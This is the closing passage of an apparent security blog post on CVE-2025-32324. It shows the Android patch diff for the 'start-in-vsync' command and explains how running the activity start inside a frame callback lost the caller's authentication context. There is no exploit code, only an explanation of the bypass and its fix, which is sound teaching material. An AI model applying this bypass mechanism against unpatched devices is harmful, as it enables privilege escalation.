</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-diff data-lang=diff><span class=line><span class=cl><span class=gu>@@ -250,21 +250,13 @@
</span></span></span><span class=line><span class=cl><span class=gu></span>                     return runStartActivity(pw);
</span></span><span class=line><span class=cl>                 case &#34;start-in-vsync&#34;:
</span></span><span class=line><span class=cl>                     final ProgressWaiter waiter = new ProgressWaiter(0);
</span></span><span class=line><span class=cl><span class=gd>-                    final int[] startResult = new int[1];    // remove complex result passing
</span></span></span><span class=line><span class=cl><span class=gd>-                    startResult[0] = -1;
</span></span></span><span class=line><span class=cl><span class=gd></span>                     mInternal.mUiHandler.runWithScissors(
</span></span><span class=line><span class=cl>                             () -&gt;
</span></span><span class=line><span class=cl> Choreographer.getInstance().postFrameCallback(frameTimeNanos -&gt; {
</span></span><span class=line><span class=cl><span class=gd>-                                try {
</span></span></span><span class=line><span class=cl><span class=gd>-                                    startResult[0] = runStartActivity(pw);  // OLD: execute in handler thread
</span></span></span><span class=line><span class=cl><span class=gd>-                                    waiter.onFinished(0, null /* extras */);
</span></span></span><span class=line><span class=cl><span class=gd>-                                } catch (Exception ex) {
</span></span></span><span class=line><span class=cl><span class=gd>-                                    getErrPrintWriter().println(
</span></span></span><span class=line><span class=cl><span class=gd>-                                            &#34;Error: unable to start activity, &#34; + ex);
</span></span></span><span class=line><span class=cl><span class=gd>-                                }
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+                                waiter.onFinished(0, null /* extras */);  // NEW: just sync timing
</span></span></span><span class=line><span class=cl><span class=gi></span>                             }),
</span></span><span class=line><span class=cl>                             USER_OPERATION_TIMEOUT_MS / 2);
</span></span><span class=line><span class=cl>                     waiter.waitForFinish(USER_OPERATION_TIMEOUT_MS);
</span></span><span class=line><span class=cl><span class=gd>-                    return startResult[0];                   // OLD: return cross-thread result
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+                    return runStartActivity(pw);            // NEW: execute in original thread!
</span></span></span></code></pre></td></tr></table></div></div><p>The fix is elegant in its simplicity: instead of executing <code>runStartActivity</code> inside the frame callback (where authentication context is lost), the patched code only uses the frame callback for timing synchronization, then executes <code>runStartActivity</code> in the original thread context where authentication information is preserved.</p><p>This change maintains the intended vsync timing behavior while completely eliminating the authentication bypass vector.</p><h2 id=final-words>Final Words<a hidden class=anchor aria-hidden=true href=#final-words>#</a></h2><p>CVE-2025-32324 demonstrates how small implementation details can create significant security flaws: a few lines of code difference between <code>start-activity</code> and <code>start-in-vsync</code> caused authentication context to be lost during thread transitions. Despite achieving complete authentication bypass, Android&rsquo;s layered security model and rapid patching cycles limited the practical exploitation window.</p><p>This vulnerability shows that modern Android security issues are often logical flaws in system design rather than traditional memory corruption bugs. Understanding how different components interact is as important as finding the initial bug.</p><p>Google&rsquo;s fix was straightforward: they kept the timing synchronization in the background thread but moved the actual security-sensitive operation back to the original thread where authentication context is preserved.</p><p><strong>The lesson:</strong> when debugging Android security, always verify which thread your code runs in and what permissions that thread actually has.</p><hr><h2 id=references>References:<a hidden class=anchor aria-hidden=true href=#references>#</a></h2><ul><li><a href=https://android.googlesource.com/platform/frameworks/base/+/c96de2de142edb854d39f5197c2f0fe6618aa482>Android Source Commit - Fix starting activity with incorrect pid/uid</a></li><li><a href=https://source.android.com/security/bulletin/2025-09-01>Android Security Bulletin Information</a></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/android/>Android</a></li><li><a href=https://s4ch.github.io/tags/vulnerability/>Vulnerability</a></li><li><a href=https://s4ch.github.io/tags/cve/>Cve</a></li><li><a href=https://s4ch.github.io/tags/authentication-bypass/>Authentication-Bypass</a></li><li><a href=https://s4ch.github.io/tags/privilege-escalation/>Privilege-Escalation</a></li><li><a href=https://s4ch.github.io/tags/system-security/>System-Security</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>